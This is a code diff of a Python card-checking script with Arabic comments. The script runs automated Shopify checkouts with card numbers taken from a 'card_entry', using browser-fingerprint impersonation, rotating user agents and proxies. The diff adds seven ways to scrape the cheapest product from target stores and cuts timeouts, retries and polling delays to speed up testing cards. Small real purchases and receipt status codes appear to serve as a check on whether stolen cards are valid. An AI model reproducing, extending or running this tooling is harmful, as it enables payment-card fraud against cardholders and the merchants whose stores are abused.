@@ -23,6 +23,11 @@ from curl_cffi.requests import Session, BrowserType
 # ──────────────────────── config ─────────────────────────────────────
 
 SITE_TXT = Path(__file__).parent / "site.txt"
+MAX_SITE_AMOUNT = 30.0
+
+# ===== إعدادات الأسعار =====
+MIN_PRODUCT_PRICE = 0.50
+MAX_PRODUCT_PRICE = 30.0
 
 BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "edge101", "safari15_5", "firefox133"]
 
@@ -38,7 +43,7 @@ USER_AGENTS = [
 
 _site_429_cache = {}
 _site_429_cache_lock = threading.Lock()
-_SITE_429_TTL = 1800  # 30 دقيقة
+_SITE_429_TTL = 1800
 
 # ──────────────────────── Enums / Result types ───────────────────────
 
@@ -75,6 +80,11 @@ class Product:
     id: int
     title: str
     variants: List[Variant]
+
+@dataclass
+class WorkingSite:
+    url: str
+    amount: float
 
 @dataclass
 class Address:
@@ -155,7 +165,7 @@ def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
 # ──────────────────────── TLS Client ─────────────────────────────────
 
 class TLSClient:
-    def __init__(self, timeout=5, proxy_url=None, impersonate=None, user_agent=None):  # timeout من 12 إلى 5
+    def __init__(self, timeout=5, proxy_url=None, impersonate=None, user_agent=None):
         self.timeout = timeout
         if impersonate is None:
             impersonate = random.choice(BROWSER_PROFILES)
@@ -225,493 +235,283 @@ def get_random_site() -> Optional[str]:
 def get_all_sites() -> List[str]:
     return load_sites_from_file(SITE_TXT)
 
-# ──────────────────────── Site tester ──────────────────────────────
-
-def test_site_alive(client: TLSClient, shop_url: str) -> bool:
-    try:
-        resp = client.get(shop_url, timeout=3)  # timeout من 10 إلى 3
-        if resp.status_code != 200:
-            return False
-        html_content = resp.text
-        if "shopify" not in html_content.lower():
-            return False
-        return True
-    except:
-        return False
-
-def get_working_sites(client: TLSClient, sites: List[str], max_to_try: int = 2) -> List[str]:  # max_to_try من 10 إلى 2
-    working = []
-    sites_to_try = sites[:max_to_try] if len(sites) > max_to_try else sites
-    random.shuffle(sites_to_try)
-    
-    for site in sites_to_try:
-        try:
-            if test_site_alive(client, site):
-                working.append(site)
-                print(f"[+] Working site found: {site}")
-            else:
-                print(f"[-] Dead site: {site}")
-        except:
-            continue
-    
-    return working
-
-def get_random_working_site(client: TLSClient) -> Optional[str]:
-    sites = get_all_sites()
-    if not sites:
-        return None
-    working = get_working_sites(client, sites)
-    if not working:
-        return None
-    return random.choice(working)
-
 # ──────────────────────── Product cache ──────────────────────────────
 
 _product_cache: Dict[str, tuple] = {}
 _product_cache_lock = threading.Lock()
-_PRODUCT_CACHE_TTL  = 3600  # ساعة
+_PRODUCT_CACHE_TTL  = 3600
 
-# ──────────────────────── Extract products from JSON ─────────────────
-
-def _extract_products_from_json(data: dict) -> List[Tuple[str, str, str, str]]:
-    """استخرج المنتجات من JSON"""
-    results = []
-    
-    def extract(obj):
-        if isinstance(obj, dict):
-            if 'product' in obj:
-                p = obj['product']
-                title = p.get('title', '')
-                product_id = str(p.get('id', ''))
-                for v in p.get('variants', []):
-                    if v.get('available', False):
-                        variant_id = str(v.get('id', ''))
-                        price = v.get('price', '0')
-                        results.append((title, product_id, variant_id, price))
-            
-            if 'products' in obj:
-                for p in obj['products']:
-                    title = p.get('title', '')
-                    product_id = str(p.get('id', ''))
-                    for v in p.get('variants', []):
-                        if v.get('available', False):
-                            variant_id = str(v.get('id', ''))
-                            price = v.get('price', '0')
-                            results.append((title, product_id, variant_id, price))
-            
-            for value in obj.values():
-                extract(value)
-        elif isinstance(obj, list):
-            for item in obj:
-                extract(item)
-    
-    extract(data)
-    return results
-
-# ──────────────────────── Find product - النسخة المطورة ─────────────────────────────────
-
-MAX_PRODUCT_PRICE = 20.0
+MAX_PRODUCT_PRICE = 30.0
 MIN_PRODUCT_PRICE = 0.50
-MAX_PRODUCT_PAGES = 5  # زيادة عدد الصفحات للبحث عن أرخص سلعة
+
+# =============================================================
+#  7 طرق مختلفة للبحث عن المنتج
+# =============================================================
+
+def _find_product_products_json(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 1: البحث من /products.json"""
+    try:
+        resp = client.get(f"{shop_url}/products.json?limit=50")
+        if resp.status_code != 200:
+            return None
+        try:
+            products = resp.json().get("products", [])
+        except:
+            return None
+        
+        best_in_range = None
+        best_in_range_price = float('inf')
+        cheapest_overall = None
+        cheapest_overall_price = float('inf')
+        
+        for p in products:
+            for v in p.get("variants", []):
+                if not v.get("available", False):
+                    continue
+                try:
+                    price = float(v.get("price") or 0)
+                except:
+                    continue
+                if price < min_price:
+                    continue
+                if price <= max_price and price < best_in_range_price:
+                    best_in_range_price = price
+                    best_in_range = (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+                if price < cheapest_overall_price:
+                    cheapest_overall_price = price
+                    cheapest_overall = (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+        
+        return best_in_range if best_in_range else cheapest_overall
+    except:
+        return None
+
+def _find_product_collections(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 2: البحث من /collections/all/products.json"""
+    try:
+        resp = client.get(f"{shop_url}/collections/all/products.json?limit=50")
+        if resp.status_code != 200:
+            return None
+        try:
+            products = resp.json().get("products", [])
+        except:
+            return None
+        
+        best_in_range = None
+        best_in_range_price = float('inf')
+        cheapest_overall = None
+        cheapest_overall_price = float('inf')
+        
+        for p in products:
+            for v in p.get("variants", []):
+                if not v.get("available", False):
+                    continue
+                try:
+                    price = float(v.get("price") or 0)
+                except:
+                    continue
+                if price < min_price:
+                    continue
+                if price <= max_price and price < best_in_range_price:
+                    best_in_range_price = price
+                    best_in_range = (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+                if price < cheapest_overall_price:
+                    cheapest_overall_price = price
+                    cheapest_overall = (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+        
+        return best_in_range if best_in_range else cheapest_overall
+    except:
+        return None
+
+def _find_product_homepage(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 3: البحث من الصفحة الرئيسية"""
+    try:
+        resp = client.get(shop_url)
+        if resp.status_code != 200:
+            return None
+        html = resp.text
+        
+        product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html)
+        
+        for link in product_links[:10]:
+            try:
+                if not link.startswith('http'):
+                    link = shop_url + link
+                product_resp = client.get(link)
+                if product_resp.status_code != 200:
+                    continue
+                product_html = product_resp.text
+                
+                variant_match = re.search(r'data-variant-id="(\d+)"', product_html)
+                if not variant_match:
+                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', product_html)
+                if not variant_match:
+                    continue
+                variant_id = variant_match.group(1)
+                price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', product_html)
+                if price_match:
+                    price = float(price_match.group(1))
+                    if price >= min_price:
+                        product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', product_html)
+                        product_id = product_match.group(1) if product_match else ""
+                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', product_html)
+                        title = title_match.group(1) if title_match else "Product"
+                        return (title, product_id, variant_id, str(price))
+            except:
+                continue
+        return None
+    except:
+        return None
+
+def _find_product_search(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 4: البحث من /search"""
+    try:
+        resp = client.get(f"{shop_url}/search?q=*&view=json")
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+                items = data.get("results", [])
+                for item in items:
+                    if "product" in item:
+                        p = item["product"]
+                        for v in p.get("variants", []):
+                            if not v.get("available", False):
+                                continue
+                            try:
+                                price = float(v.get("price") or 0)
+                            except:
+                                continue
+                            if price >= min_price:
+                                return (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+            except:
+                pass
+        return None
+    except:
+        return None
+
+def _find_product_sitemap(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 5: البحث من sitemap.xml"""
+    try:
+        resp = client.get(f"{shop_url}/sitemap.xml")
+        if resp.status_code != 200:
+            return None
+        sitemap = resp.text
+        product_urls = re.findall(r'<loc>([^<]*\/products\/[^<]+)<\/loc>', sitemap)
+        
+        for url in product_urls[:10]:
+            try:
+                handle_match = re.search(r'/products/([^/?]+)', url)
+                if handle_match:
+                    handle = handle_match.group(1)
+                    resp = client.get(f"{shop_url}/products/{handle}.json")
+                    if resp.status_code == 200:
+                        data = resp.json()
+                        p = data.get("product", {})
+                        for v in p.get("variants", []):
+                            if not v.get("available", False):
+                                continue
+                            try:
+                                price = float(v.get("price") or 0)
+                            except:
+                                continue
+                            if price >= min_price:
+                                return (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+            except:
+                continue
+        return None
+    except:
+        return None
+
+def _find_product_by_handle(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 6: البحث عن منتج عن طريق handle من الصفحة الرئيسية"""
+    try:
+        resp = client.get(shop_url)
+        if resp.status_code != 200:
+            return None
+        html = resp.text
+        
+        # البحث عن handles من الروابط
+        handles = re.findall(r'/products/([^/?"]+)', html)
+        for handle in set(handles[:10]):
+            try:
+                resp = client.get(f"{shop_url}/products/{handle}.json")
+                if resp.status_code == 200:
+                    data = resp.json()
+                    p = data.get("product", {})
+                    for v in p.get("variants", []):
+                        if not v.get("available", False):
+                            continue
+                        try:
+                            price = float(v.get("price") or 0)
+                        except:
+                            continue
+                        if price >= min_price:
+                            return (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+            except:
+                continue
+        return None
+    except:
+        return None
+
+def _find_any_product(client: TLSClient, shop_url: str, min_price: float, max_price: float) -> Optional[Tuple[str, str, str, str]]:
+    """الطريقة 7: البحث عن أي منتج من /products.json بدون شروط"""
+    try:
+        resp = client.get(f"{shop_url}/products.json?limit=10")
+        if resp.status_code != 200:
+            return None
+        try:
+            products = resp.json().get("products", [])
+        except:
+            return None
+        
+        for p in products:
+            for v in p.get("variants", []):
+                if v.get("available", False):
+                    try:
+                        price = float(v.get("price") or 0)
+                    except:
+                        price = 0
+                    return (p.get("title", "Product"), str(p.get("id", "")), str(v.get("id", "")), v.get("price", "0"))
+        return None
+    except:
+        return None
+
+# =============================================================
+#  الدالة الرئيسية للبحث عن المنتج - تجمع كل الطرق
+# =============================================================
 
 def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE, fallback_sites: List[str] = None) -> Tuple[str, str, str, str]:
     now = _time.time()
     
-    with _site_429_cache_lock:
-        if shop_url in _site_429_cache:
-            if now - _site_429_cache[shop_url] < _SITE_429_TTL:
-                if fallback_sites:
-                    random.shuffle(fallback_sites)
-                    for alt_site in fallback_sites[:2]:  # من 5 إلى 2
-                        if alt_site != shop_url:
-                            try:
-                                return find_cheapest_product(client, alt_site, min_price, max_price, None)
-                            except:
-                                continue
-                raise Exception(f"Site blocked (429) - no working fallback")
-            else:
-                del _site_429_cache[shop_url]
-    
+    # التحقق من الكاش
     with _product_cache_lock:
         cached = _product_cache.get(shop_url)
         if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
             return cached[:-1]
     
-    try:
-        result = _find_product_from_sources(client, shop_url, min_price, max_price)
-        if result:
-            with _product_cache_lock:
-                _product_cache[shop_url] = (*result, now)
-            return result
-    except Exception as e:
-        if "429" in str(e):
-            with _site_429_cache_lock:
-                _site_429_cache[shop_url] = now
-            if fallback_sites:
-                random.shuffle(fallback_sites)
-                for alt_site in fallback_sites[:2]:
-                    if alt_site != shop_url:
-                        try:
-                            return find_cheapest_product(client, alt_site, min_price, max_price, None)
-                        except:
-                            continue
-            raise Exception(f"Site returned 429 - no working fallback")
-        raise e
+    # قائمة بكل طرق البحث - 7 طرق
+    search_methods = [
+        _find_product_products_json,
+        _find_product_collections,
+        _find_product_homepage,
+        _find_product_search,
+        _find_product_sitemap,
+        _find_product_by_handle,
+        _find_any_product,
+    ]
     
-    # إذا لم نجد منتجاً بالسعر المطلوب، نبحث عن أرخص سلعة
-    return _find_cheapest_product_any_price(client, shop_url)
-
-def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    # ===== 1. جرب من /collections/all =====
-    try:
-        result = _find_product_from_collections(client, shop_url, min_price, max_price)
-        if result:
-            return result
-    except Exception as e:
-        if "429" in str(e):
-            raise e
-    
-    # ===== 2. جرب من /search =====
-    try:
-        result = _find_product_from_search(client, shop_url, min_price, max_price)
-        if result:
-            return result
-    except Exception as e:
-        if "429" in str(e):
-            raise e
-    
-    # ===== 3. جرب من الصفحة الرئيسية =====
-    try:
-        result = _find_product_from_homepage(client, shop_url, min_price, max_price)
-        if result:
-            return result
-    except Exception as e:
-        if "429" in str(e):
-            raise e
-    
-    # ===== 4. جرب من /products.json (مع بحث شامل) =====
-    try:
-        result = _find_product_from_products_json_extended(client, shop_url, min_price, max_price)
-        if result:
-            return result
-    except Exception as e:
-        if "429" in str(e):
-            raise e
-    
-    return None
-
-def _find_product_from_homepage(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    try:
-        resp = client.get(shop_url, timeout=3)
-        if resp.status_code == 429:
-            raise Exception("returned 429")
-        if resp.status_code != 200:
-            return None
-        
-        html_content = resp.text
-        product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
-        
-        if product_links:
-            for link in product_links[:2]:  # من 5 إلى 2
-                try:
-                    if not link.startswith('http'):
-                        link = shop_url + link
-                    
-                    resp = client.get(link, timeout=3)
-                    if resp.status_code != 200:
-                        continue
-                    
-                    html_content = resp.text
-                    
-                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
-                    if not variant_match:
-                        variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
-                    if not variant_match:
-                        continue
-                    
-                    variant_id = variant_match.group(1)
-                    
-                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
-                    if price_match:
-                        price = float(price_match.group(1))
-                        if min_price <= price <= max_price:
-                            product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
-                            product_id = product_match.group(1) if product_match else ""
-                            
-                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
-                            title = title_match.group(1) if title_match else "Product"
-                            
-                            return title, product_id, variant_id, str(price)
-                except:
-                    continue
-        
-        json_match = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', html_content, re.DOTALL)
-        if json_match:
-            try:
-                data = json.loads(json_match.group(1))
-                products = _extract_products_from_json(data)
-                for title, product_id, variant_id, price in products:
-                    price_val = float(price)
-                    if min_price <= price_val <= max_price:
-                        return title, product_id, variant_id, price
-            except:
-                pass
-        
-        return None
-    except:
-        return None
-
-def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    try:
-        resp = client.get(f"{shop_url}/collections/all", timeout=3)
-        if resp.status_code == 429:
-            raise Exception("returned 429")
-        if resp.status_code != 200:
-            return None
-        
-        html_content = resp.text
-        product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
-        
-        if product_links:
-            for link in product_links[:2]:  # من 5 إلى 2
-                try:
-                    if not link.startswith('http'):
-                        link = shop_url + link
-                    
-                    resp = client.get(link, timeout=3)
-                    if resp.status_code != 200:
-                        continue
-                    
-                    html_content = resp.text
-                    
-                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
-                    if not variant_match:
-                        variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
-                    if not variant_match:
-                        continue
-                    
-                    variant_id = variant_match.group(1)
-                    
-                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
-                    if price_match:
-                        price = float(price_match.group(1))
-                        if min_price <= price <= max_price:
-                            product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
-                            product_id = product_match.group(1) if product_match else ""
-                            
-                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
-                            title = title_match.group(1) if title_match else "Product"
-                            
-                            return title, product_id, variant_id, str(price)
-                except:
-                    continue
-        
+    # تجربة كل طريقة
+    for method in search_methods:
         try:
-            resp = client.get(f"{shop_url}/collections/all/products.json?limit=5", timeout=3)  # limit من 5 إلى 5
-            if resp.status_code == 200:
-                data = resp.json()
-                for p in data.get('products', []):
-                    for v in p.get('variants', []):
-                        if v.get('available', False):
-                            price = float(v.get('price', 0))
-                            if min_price <= price <= max_price:
-                                return p.get('title', ''), str(p.get('id', '')), str(v.get('id', '')), v.get('price', '0')
-        except:
-            pass
-        
-        return None
-    except:
-        return None
-
-def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    try:
-        resp = client.get(f"{shop_url}/search?q=*&view=json", timeout=3)
-        if resp.status_code == 429:
-            raise Exception("returned 429")
-        if resp.status_code == 200:
-            try:
-                data = resp.json()
-                for item in data.get('results', []):
-                    if 'product' in item:
-                        p = item['product']
-                        for v in p.get('variants', []):
-                            if v.get('available', False):
-                                price = float(v.get('price', 0))
-                                if min_price <= price <= max_price:
-                                    return p.get('title', ''), str(p.get('id', '')), str(v.get('id', '')), v.get('price', '0')
-            except:
-                pass
-        
-        resp = client.get(f"{shop_url}/search?q=*", timeout=3)
-        if resp.status_code == 429:
-            raise Exception("returned 429")
-        if resp.status_code != 200:
-            return None
-        
-        html_content = resp.text
-        product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
-        
-        if product_links:
-            for link in product_links[:2]:  # من 5 إلى 2
-                try:
-                    if not link.startswith('http'):
-                        link = shop_url + link
-                    
-                    resp = client.get(link, timeout=3)
-                    if resp.status_code != 200:
-                        continue
-                    
-                    html_content = resp.text
-                    
-                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
-                    if not variant_match:
-                        variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
-                    if not variant_match:
-                        continue
-                    
-                    variant_id = variant_match.group(1)
-                    
-                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
-                    if price_match:
-                        price = float(price_match.group(1))
-                        if min_price <= price <= max_price:
-                            product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
-                            product_id = product_match.group(1) if product_match else ""
-                            
-                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
-                            title = title_match.group(1) if title_match else "Product"
-                            
-                            return title, product_id, variant_id, str(price)
-                except:
-                    continue
-        
-        return None
-    except:
-        return None
-
-def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    """بحث موسع في products.json مع إمكانية تصفح عدة صفحات"""
-    with _site_429_cache_lock:
-        if shop_url in _site_429_cache:
-            if _time.time() - _site_429_cache[shop_url] < _SITE_429_TTL:
-                raise Exception(f"Site blocked (429) - try another site")
-    
-    best_price = float('inf')
-    product_title = ""
-    product_id = ""
-    variant_id = ""
-    price_str = ""
-    
-    # البحث في عدة صفحات
-    for page in range(1, MAX_PRODUCT_PAGES + 1):
-        try:
-            resp = client.get(f"{shop_url}/products.json?limit=5&page={page}", timeout=3)
-            
-            if resp.status_code == 429:
-                with _site_429_cache_lock:
-                    _site_429_cache[shop_url] = _time.time()
-                raise Exception("GET products.json returned 429")
-            
-            if resp.status_code != 200:
-                break
-            
-            try:
-                products = resp.json().get("products", [])
-            except:
-                break
-            
-            if not products:
-                break
-            
-            for p in products:
-                for v in p.get("variants", []):
-                    if not v.get("available", False):
-                        continue
-                    try:
-                        price = float(v.get("price") or 0)
-                    except (ValueError, TypeError):
-                        continue
-                    
-                    # إذا كان السعر ضمن النطاق المطلوب، نختاره مباشرة
-                    if min_price <= price <= max_price:
-                        if price < best_price:
-                            best_price = price
-                            product_title = p.get("title", "")
-                            product_id = str(p.get("id", ""))
-                            variant_id = str(v.get("id", ""))
-                            price_str = v.get("price", "")
-            
-            # إذا وجدنا منتجاً بسعر مناسب، نخرجه
-            if product_title:
-                return product_title, product_id, variant_id, price_str
-                
-        except Exception as e:
-            if "429" in str(e):
-                raise e
+            result = method(client, shop_url, min_price, max_price)
+            if result:
+                with _product_cache_lock:
+                    _product_cache[shop_url] = result + (now,)
+                return result
+        except Exception:
             continue
     
-    # إذا لم نجد منتجاً بالسعر المطلوب، نبحث عن أرخص سلعة في الموقع
-    return _find_cheapest_product_any_price(client, shop_url)
-
-def _find_cheapest_product_any_price(client: TLSClient, shop_url: str) -> Tuple[str, str, str, str]:
-    """
-    تبحث عن أرخص سلعة في الموقع بغض النظر عن السعر
-    """
-    with _site_429_cache_lock:
-        if shop_url in _site_429_cache:
-            if _time.time() - _site_429_cache[shop_url] < _SITE_429_TTL:
-                raise Exception(f"Site blocked (429) - try another site")
-    
-    cheapest_price = float('inf')
-    cheapest_title = ""
-    cheapest_product_id = ""
-    cheapest_variant_id = ""
-    cheapest_price_str = ""
-    
-    # البحث في products.json
-    for page in range(1, MAX_PRODUCT_PAGES + 1):
-        try:
-            resp = client.get(f"{shop_url}/products.json?limit=5&page={page}", timeout=3)
-            
-            if resp.status_code == 429:
-                with _site_429_cache_lock:
-                    _site_429_cache[shop_url] = _time.time()
-                raise Exception("GET products.json returned 429")
-            
-            if resp.status_code != 200:
-                break
-            
-            try:
-                products = resp.json().get("products", [])
-            except:
-                break
-            
-            if not products:
-                break
-            
-            for p in products:
-                for v in p.get("variants", []):
-                    if not v.get("available", False):
-                        continue
-                    try:
-                        price = float(v.get("price") or 0)
-                    except (ValueError, TypeError):
-                        continue
-                    if price < cheapest_price:
-                        cheapest_price = price
-                        cheapest_title = p.get("title", "Product")
-                        cheapest_product_id = str(p.get("id", ""))
-                        cheapest_variant_id = str(v.get("id", ""))
-                        cheapest_price_str = v.get("price", "0")
-        except Exception as e:
-            if "429" in str(e):
-                raise e
-            continue
-    
-    if not cheapest_title:
-        raise Exception(f"No available products found at {shop_url}")
-    
-    return cheapest_title, cheapest_product_id, cheapest_variant_id, cheapest_price_str
+    # لو كل الطرق فشلت
+    raise Exception(f"No available products found at {shop_url}")
 
 # ──────────────────────── Step 1: cart → checkout ────────────────────
 
@@ -1088,7 +888,7 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
         "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
 
-    with Session(impersonate=random.choice(BROWSER_PROFILES), timeout=5) as session:  # timeout من 12 إلى 5
+    with Session(impersonate=random.choice(BROWSER_PROFILES), timeout=5) as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
         resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
@@ -1747,15 +1547,12 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = random.choice(USER_AGENTS)
     
-    client = TLSClient(timeout=5, proxy_url=proxy_url,  # timeout من 12 إلى 5
+    client = TLSClient(timeout=5, proxy_url=proxy_url,
                        impersonate=impersonate, user_agent=user_agent)
     
     try:
-        all_sites = get_all_sites()
-        fallback_sites = [s for s in all_sites if s != shop_url][:2] if all_sites else None  # من 5 إلى 2
-        
         try:
-            title, product_id, variant_id, price = find_cheapest_product(client, shop_url, fallback_sites=fallback_sites)
+            title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
             _ = title, product_id
         except Exception as e:
             result.status = CheckStatus.ERROR
@@ -1809,6 +1606,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                               currency, country)
+            
             cur = extract_seller_currency(proposal_body)
             if cur and cur != currency:
                 currency = cur
@@ -1816,10 +1614,12 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             if ctr and ctr != country:
                 country = ctr
             result.currency = currency
+            
             if currency == "USD":
                 seller_price = extract_seller_merchandise_price(proposal_body)
                 if seller_price and seller_price != price:
                     price = seller_price
+            
             queue_token = extract_queue_token(proposal_body)
             if not queue_token:
                 raise Exception("could not extract queueToken")
@@ -1870,7 +1670,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 
                 signed_check = extract_signed_handles(p3_body)
                 if not signed_check:
-                    time.sleep(0.02)  # من 0.05 إلى 0.02
+                    time.sleep(0.02)
                     _, p3_body2 = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                  q3, email, addr, currency, country)
@@ -1932,7 +1732,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             current_tax = extract_tax_amount(final_proposal_body)
             current_total = total_amount
             
-            # ===== تعديل: تقليل محاولات الضريبة من 4 إلى 2 =====
             MAX_TAX_RETRIES = 2
             for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                 submit_status, submit_body = send_submit_for_completion(
@@ -1981,7 +1780,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
         
-        # ===== تعديل: تقليل محاولات Polling من 30 إلى 5 =====
         for poll_num in range(1, 6):
             try:
                 _, poll_body = send_poll_for_receipt(
@@ -1997,7 +1795,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 status_code = extract_receipt_status_code(poll_body, receipt_type)
                 result.status_code = status_code
                 
-                # ===== استخراج receipt_url =====
                 try:
                     poll_json = json.loads(poll_body)
                     receipt_obj = poll_json.get("data", {}).get("receipt", {})
@@ -2047,8 +1844,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                         result.error = Exception(f"{error_code}")
                         return result
                 
-                # ===== تعديل: تقليل زمن الانتظار =====
-                delay = 50  # من 500 إلى 50
+                delay = 50
                 match = poll_delay_re.search(poll_body)
                 if match:
                     try:
@@ -2065,7 +1861,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 return result
         
         result.status = CheckStatus.ERROR
-        result.error = Exception("exceeded 5 poll attempts")  # من 30 إلى 5
+        result.error = Exception("exceeded 5 poll attempts")
         return result
         
     finally:
